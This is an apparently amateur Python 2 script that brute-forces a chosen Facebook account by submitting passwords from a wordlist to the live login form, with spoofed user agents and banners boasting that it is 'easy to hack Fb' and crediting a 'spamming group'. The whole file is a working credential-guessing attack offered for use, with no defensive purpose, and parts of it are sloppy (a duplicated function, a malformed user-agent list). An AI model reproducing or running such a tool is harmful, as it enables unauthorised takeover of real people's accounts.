#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random

#welcome
def welcome():
        wel = """
                                                  \033[1;91m
 Love──████████──████████─Sty home stay sefty \033[1;91m
 hate──██▒▒▒▒██──██▒▒▒▒██─learn code     \033[1;91m
late ──████▒▒██──██▒▒████─No one can hack fb     \033[1;91m
 nate────██▒▒▒▒██▒▒▒▒██───Easy to hack Fb      \033[1;91m
 mate────████▒▒▒▒▒▒████───Hello World     \033[1;91m
 wast──────██▒▒▒▒▒▒██─────New Command      \033[1;91m
gast ────████▒▒▒▒▒▒████───DevilanD      \033[1;91m
  cest───██▒▒▒▒██▒▒▒▒██───Never give up     \033[1;91m
 nest──████▒▒██──██▒▒████➤Ajijul Hasan Jibon \033[1;91m
 rest──██▒▒▒▒██──██▒▒▒▒██─create good wordlist      \033[1;91m
 best──████████──████████─JIBON VAI       \033[1;91m
\033[1;97m╔═════════════════════════════════════════════════════════════╗
\033[1;97m║\033[1;93m* \033[1;97mAuthor: \033[1;91m: \033[1;96m[AJIJUL HASAN JIBON🥰]   \033[1;97m                                    ║
\033[1;97m║\033[1;93m* \033[1;97mSpamimg Group \033[1;91m : \033[1;96m CYBER GANG(MOD). \033[1;97m              ║
\033[1;97m╚═════════════════════════════════════════════════════════════╝"""


email = str(raw_input("FB tergat ID : "))


passwordlist = str(raw_input("wordlist path : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        welcome()
        search()
        print("Password does not exist try again")



def brute(password):
        sys.stdout.write("\r[®] Matching ..... {}\n".format(password))
        sys.stdout.flush()
        br.addheaders = [('User-agent', random.choice(useragents))]
        site = br.open(login)
        br.select_form(nr = 0)
        br.form['email'] = email
        br.form['pass'] = password
        sub = br.submit()
        log = sub.geturl()
        if log != login and (not 'login_attempt' in log):
                        print("\n\n[+] Password Match = {}".format(password))
                        raw_input("ANY KEY to Exit....")
                        sys.exit(1)


def search():
        global password
        passwords = open(passwordlist,"r")
        for password in passwords:
                password = password.replace("\n","")
                brute(password)


#welcome
def welcome():
        wel = """
                                                  \033[1;91m
 Love──████████──████████─Sty home stay sefty \033[1;91m
 hate──██▒▒▒▒██──██▒▒▒▒██─learn code     \033[1;91m
late ──████▒▒██──██▒▒████─No one can hack fb     \033[1;91m
 nate────██▒▒▒▒██▒▒▒▒██───Easy to hack Fb      \033[1;91m
 mate────████▒▒▒▒▒▒████───Hello World     \033[1;91m
 wast──────██▒▒▒▒▒▒██─────Try Again      \033[1;91m
gast ────████▒▒▒▒▒▒████───DevilanD      \033[1;91m
  cest───██▒▒▒▒██▒▒▒▒██───Never give up     \033[1;91m
 nest──████▒▒██──██▒▒████─Nawazuddin    \033[1;91m
 rest──██▒▒▒▒██──██▒▒▒▒██─create good wordlist      \033[1;91m
 best──████████──████████─Joy Aai ASSAM      \033[1;91m
\033[1;97m╔═════════════════════════════════════════════════════════════╗
\033[1;97m║\033[1;93m* \033[1;97mAuthor: \033[1;91m: \033[1;96m[JIBON VAI]   \033[1;97m                                    ║
\033[1;97m║\033[1;93m* \033[1;97mAJIJUL HASAN \033[1;91m : \033[1;96m JIBON \033[1;97m              ║
\033[1;97m╚═════════════════════════════════════════════════════════════╝"""

        total = open(passwordlist,"r")
        total = total.readlines()
        print wel
        print " [®] Account to crack : {}".format(email)
        print " [®] Loaded :" , len(total), "passwords"
        print " [®] Matching, please wait ...\n\n"


if __name__ == '__main__':
        main()
